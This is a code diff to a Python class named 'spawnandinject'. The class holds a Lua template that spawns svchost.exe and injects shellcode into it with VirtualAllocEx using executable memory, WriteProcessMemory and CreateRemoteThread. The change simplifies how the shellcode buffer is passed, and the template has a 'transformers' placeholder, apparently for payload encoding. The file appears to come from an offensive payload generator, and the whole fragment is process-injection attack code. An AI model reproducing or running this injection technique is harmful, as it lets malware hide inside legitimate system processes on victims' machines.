@@ -17,9 +17,7 @@ class spawnandinject:
     def template(self) -> str:
         return """
 
-    local shellcodeArray = c.Array("c", 1, {shellcodeSize})
     {transformers}
-    local shellcodeBytes = shellcodeArray {{ shellcode }}
 
     local target = c.string("C:\\\\windows\\\\system32\\\\svchost.exe")
     local startupinfoa = c.Struct("JpppJJJJJJJJSSpppp", "cb", "lpReserved", "lpDesktop", "lpTitle", "dwX", "dwY", "dwXSize", "dwYSize", "dwXCountChars", "dwYCountChars", "dwFillAttribute","dwFlags","wShowWindow","cbReserved2", "lpReserved2", "hStdInput", "hStdOutput", "hStdError")
@@ -31,7 +29,7 @@ class spawnandinject:
 
     local address = {VirtualAllocEx}(pi.hProcess, c.NULL, 460, 0x3000, 0x40)
 
-    {WriteProcessMemory}(pi.hProcess, address, c.Pointer(shellcodeBytes[0]), 460, c.NULL)
+    {WriteProcessMemory}(pi.hProcess, address, c.Pointer(shellcode[0]), 460, c.NULL)
 
     local hThread = {CreateRemoteThread}(pi.hProcess, c.NULL, 0, address, c.NULL, 0, c.NULL)
 
